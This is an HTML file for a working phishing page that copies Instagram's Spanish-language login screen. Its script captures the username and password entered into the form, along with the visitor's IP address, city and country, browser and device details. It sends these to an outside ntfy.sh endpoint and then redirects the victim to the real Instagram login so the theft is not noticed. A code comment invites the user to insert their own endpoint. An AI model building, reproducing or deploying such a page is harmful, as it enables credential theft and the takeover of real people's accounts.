<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Instagram</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 0;
    }

    .container {
      width: 350px;
      padding: 40px;
      background-color: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .container img {
      margin-bottom: 30px;
      width: 175px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
      box-sizing: border-box;
    }

    .btn-login {
      margin-top: 10px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      padding: 8px;
      border-radius: 4px;
      cursor: pointer;
      width: 100%;
    }

    .btn-login:hover {
      background-color: #318ce7;
    }

    .separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
      text-align: center;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: bold;
    }

    .separator::before,
    .separator::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid #dbdbdb;
    }

    .separator:not(:empty)::before {
      margin-right: .75em;
    }

    .separator:not(:empty)::after {
      margin-left: .75em;
    }

    .fb-login {
      color: #385185;
      font-weight: bold;
      text-decoration: none;
      display: block;
      margin: 15px 0;
      font-size: 14px;
    }

    .forgot-pw {
      color: #00376b;
      text-decoration: none;
      font-size: 12px;
    }

    .signup {
      margin-top: 20px;
      font-size: 14px;
    }

    .signup a {
      color: #3897f0;
      font-weight: bold;
      text-decoration: none;
    }

    .app-download {
      margin-top: 20px;
      font-size: 14px;
    }

    .app-stores {
      margin-top: 20px;
    }

    .app-stores img {
      width: 136px;
      height: 40px;
      margin: 0 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" />
    
    <form id="loginForm">
      <input type="text" name="usuario" placeholder="Tel√©fono, usuario o correo electr√≥nico" required />
      <input type="password" name="contrasena" placeholder="Contrase√±a" required />
      <button type="submit" class="btn-login">Iniciar sesi√≥n</button>
    </form>
    
    <div class="separator">O</div>
    
    <a href="#" class="fb-login">Iniciar sesi√≥n con Facebook</a>
    <a href="#" class="forgot-pw">¬øHas olvidado la contrase√±a?</a>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const usuario = this.usuario.value;
      const contrasena = this.contrasena.value;
      
      try {
        // Obtener IP del usuario
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;
        
        // Obtener ubicaci√≥n aproximada
        const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const locationData = await locationResponse.json();
        
        // Obtener informaci√≥n del navegador
        const userAgent = navigator.userAgent;
        const screenResolution = `${window.screen.width}x${window.screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        
        // Crear mensaje con toda la informaci√≥n
        const mensaje = `üîî Nuevo inicio de sesi√≥n detectado:
üë§ Usuario: ${usuario}
üîê Contrase√±a: ${contrasena}
üåê IP: ${ip}
üìç Ubicaci√≥n: ${locationData.city}, ${locationData.region}, ${locationData.country_name}
üñ•Ô∏è Dispositivo: ${userAgent}
üñ•Ô∏è Resoluci√≥n: ${screenResolution}
‚è∞ Zona horaria: ${timezone}
üó£Ô∏è Idioma: ${language}`;
        
        // Enviar datos (aqu√≠ deber√≠as poner tu endpoint)
        await fetch('https://ntfy.sh/3kG4epWMkei6KLLq', {
          method: 'POST',
          headers: {
            'Title': '‚ö†Ô∏è Nuevo login Instagram',
            'Priority': 'high'
          },
          body: mensaje
        });
        
        // Redirigir despu√©s de enviar los datos (opcional)
        setTimeout(() => {
          window.location.href = 'https://www.instagram.com/accounts/login/';
        }, 1500);
        
      } catch (error) {
        console.error("Error al enviar datos:", error);
        // Redirigir aunque falle el env√≠o de datos
        window.location.href = 'https://www.instagram.com/accounts/login/';
      }
    });
  </script>
</body>
</html>
